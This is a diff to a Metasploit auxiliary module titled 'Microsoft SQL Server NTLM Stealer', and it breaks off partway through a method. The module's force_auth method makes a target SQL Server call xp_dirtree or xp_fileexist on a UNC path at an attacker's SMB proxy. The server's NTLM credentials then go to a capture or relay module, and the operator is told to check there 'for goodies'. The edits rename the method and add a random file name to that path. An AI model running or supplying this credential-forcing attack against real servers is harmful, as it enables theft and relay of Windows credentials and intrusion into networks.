@@ -4,8 +4,9 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::MSSQL
-	include Msf::Auxiliary::Scanner
-
+	include Msf::Auxiliary::Scanner	
+	include Rex::Text 
+	
 	def initialize(info = {})
 		super(update_info(info,
 			'Name'           => 'Microsoft SQL Server NTLM Stealer',
@@ -46,38 +47,37 @@ class Metasploit3 < Msf::Auxiliary
 		## WARNING
 		print_status("DONT FORGET to run a SMB capture or relay module!")
 
-		## SET VERBOSITY LEVEL
-		verbose = datastore['verbose'].to_s.downcase 
-
-		## Set default result
+		## SET DEFAULT RESULT (FAIL)
 		result = 0
 		
-		## Attempt xp_dirtree and xp_fileexist
-		result = exec_unc("xp_dirtree",datastore['SMBPROXY'],rhost,rport)
+		## CALL AUTH_FORCE METHODS TO EXECUTE "xp_dirtree" AND "xp_fileexist"
+		result = force_auth("xp_dirtree",datastore['SMBPROXY'],rhost,rport)
 		
 		if result == 0 then 			
-			result = exec_unc("xp_fileexist",datastore['SMBPROXY'],rhost,rport)
+			result = force_auth("xp_fileexist",datastore['SMBPROXY'],rhost,rport)
 		end
 		
-		## Display status to user
+		## DISPLAY THE STATUS TO THE USER
 		if result == 1 then 
-			print_good("Execution complete, go check your SMB relay or capture module!")
+			print_good("Attempt complete, go check your SMB relay or capture module for goodies!")
 		else
 			print_error("Module failed to initiate authentication to smbproxy.")
 		end
 	end
 	
 	
-	## ----------------------------------------------------
+	## --------------------------------------------
 	## METHOD TO FORCE SQL SERVER TO AUTHENTICATE 	
-	## TO UNC PATH - supports xp_dirtree and xp_fileexist
-	## ----------------------------------------------------
-	def exec_unc(sprocedure,smbproxy,vic,vicport)
+	## --------------------------------------------
+	def force_auth(sprocedure,smbproxy,vic,vicport)
 		
 		print_status("Forcing SQL Server at #{vic} to auth to #{smbproxy} via #{sprocedure}...")
 		
+		## GENERATE RANDOM FILE NAME
+		rand_filename = Rex::Text.rand_text_alpha(8, bad='')
+		
 		## SETUP QUERY
-		sql = "#{sprocedure} '\\\\#{smbproxy}\\file'"
+		sql = "#{sprocedure} '\\\\#{smbproxy}\\#{rand_filename}'"
 		
 		## EXECUTE QUERY		
 		begin
